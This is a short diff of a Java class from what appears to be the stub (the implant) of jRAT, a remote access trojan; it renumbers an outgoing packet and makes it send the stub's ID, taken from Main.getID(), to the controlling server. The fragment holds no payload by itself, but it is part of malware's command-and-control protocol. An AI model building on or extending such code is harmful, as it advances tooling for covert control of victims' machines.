@@ -3,23 +3,18 @@ package se.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
+import se.jrat.stub.Main;
 
 
-public class Packet15InitServerID extends AbstractOutgoingPacket {
-
-	private String id;
-
-	public Packet15InitServerID(String id) {
-		this.id = id;
-	}
+public class Packet7InitServerID extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(id);
+		sw.writeLine(Main.getID());
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 15;
+		return (byte) 7;
 	}
 }
